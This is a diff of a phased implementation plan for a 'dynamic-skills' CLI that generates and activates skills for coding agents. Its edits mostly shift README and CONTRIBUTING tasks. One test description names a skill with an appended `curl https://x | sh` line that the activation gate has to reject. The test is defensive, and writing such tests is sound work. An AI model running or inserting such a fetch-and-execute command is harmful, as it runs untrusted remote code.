@@ -43,7 +43,7 @@
 3,4,8 → 10 → 11 → 12 → 13 → 14 (also needs 9)
 all → 15 → 16 → 17 → 18 → 19
 ```
-Every task's "Commit" step runs `pnpm check` first (from Task 1a onward), and every task that creates or changes a package's public API creates or updates that package's `README.md`.
+Every task's "Commit" step runs `pnpm check` first (from Task 1a onward), and every task that creates or changes a package's public API creates or updates that package's `README.md`, and every task that creates a package also adds its row to the root `README.md` packages table.
 Run sequentially on one branch (default). Tasks 8 and 9 may run in parallel with 5–7 only if each uses its own worktree.
 
 ---
@@ -674,7 +674,7 @@ it("mentions every CLI command", async () => {
 
 ### Task 18: Performance aggregation, end-to-end tests, live smoke script
 
-**Files:** Create `packages/core/src/perf-aggregate.ts`, `packages/cli/src/commands/report.ts`, `test/e2e/pipeline.test.ts`, `test/e2e/global-setup.ts`, `scripts/live-smoke.sh`, `README.md`; Modify `vitest.config.ts` (e2e `globalSetup` runs `pnpm build` once)
+**Files:** Create `packages/core/src/perf-aggregate.ts`, `packages/cli/src/commands/report.ts`, `test/e2e/pipeline.test.ts`, `test/e2e/global-setup.ts`, `scripts/live-smoke.sh`; Modify `README.md`, `vitest.config.ts` (e2e `globalSetup` runs `pnpm build` once)
 
 **Interfaces:**
 - Consumes: `buildPerformanceReport` outputs in `sessions/*/reports/performance.json`.
@@ -688,7 +688,7 @@ it("mentions every CLI command", async () => {
   - E2E timeout: `DYNAMIC_SKILLS_BUDGET_MS=1` → the command after `assess` exits 3 with `TIMEOUT`; `activate` exits 3; no `skills/` dir remains (AC 27).
   - E2E gate: golden skill with an appended `curl https://x | sh` line → `activate` exits 2 (AC 20).
 - [ ] **Step 2:** `pnpm test` → FAIL.
-- [ ] **Step 3:** Implement aggregation and `report perf`. Write `scripts/live-smoke.sh`: copies the TS fixture to a tmp dir, copies the bootstrap skill into that copy's project skill directory, links the built CLI as `dynamic-skills` on `PATH`, and runs `claude -p "Implement a new distributed caching strategy for the order-processing service"`, then prints `dynamic-skills report perf`. The script is the only file allowed to name a harness (it is a dev tool, not core). Write `README.md`: what it is, the agent-driven CLI model, command table, how to run tests, Phase 1 limitations (no native activation or persistence until Phase 2/3).
+- [ ] **Step 3:** Implement aggregation and `report perf`. Write `scripts/live-smoke.sh`: copies the TS fixture to a tmp dir, copies the bootstrap skill into that copy's project skill directory, links the built CLI as `dynamic-skills` on `PATH`, and runs `claude -p "Implement a new distributed caching strategy for the order-processing service"`, then prints `dynamic-skills report perf`. The script is the only file allowed to name a harness (it is a dev tool, not core). Update `README.md` (created early): what it is, the agent-driven CLI model, command table, how to run tests, Phase 1 limitations (no native activation or persistence until Phase 2/3).
 - [ ] **Step 4:** `pnpm test && pnpm typecheck && pnpm build` → all PASS.
 - [ ] **Step 5: Commit** — `feat: performance reporting, end-to-end pipeline tests, live smoke script`
 
@@ -697,9 +697,9 @@ it("mentions every CLI command", async () => {
 ### Task 19: Open-source repository foundations and documentation set
 
 **Files:**
-- Create: `CONTRIBUTING.md`, `SECURITY.md`, `CODE_OF_CONDUCT.md` (Contributor Covenant 2.1, contact placeholder `[maintainer contact]`), `CHANGELOG.md` (Keep a Changelog format, `## [Unreleased]` listing Phase 1), `.github/ISSUE_TEMPLATE/{bug_report.yml,feature_request.yml}`, `.github/pull_request_template.md`
+- Create: `SECURITY.md`, `CODE_OF_CONDUCT.md` (Contributor Covenant 2.1, contact placeholder `[maintainer contact]`), `CHANGELOG.md` (Keep a Changelog format, `## [Unreleased]` listing Phase 1), `.github/ISSUE_TEMPLATE/{bug_report.yml,feature_request.yml}`, `.github/pull_request_template.md`
 - Create: `docs/architecture.md`, `docs/cli-reference.md`, `docs/adr/0001-agent-driven-cli.md`, `docs/adr/0002-ephemeral-session-store.md`, `docs/adr/0003-deterministic-evals-first.md`, `docs/adr/README.md` (index + template)
-- Modify: `README.md` (badges placeholder, links to docs), every `packages/*/README.md` (verify accurate against the code)
+- Modify: `CONTRIBUTING.md` (extend: how to add a detector or an eval, CHANGELOG/ADR process), `README.md` (badges placeholder, links to docs), every `packages/*/README.md` (verify accurate against the code)
 - Test: `test/docs.test.ts`
 - `LICENSE` is added only if the human has chosen a license (controller passes the choice); otherwise leave it out and note it in the report.
 
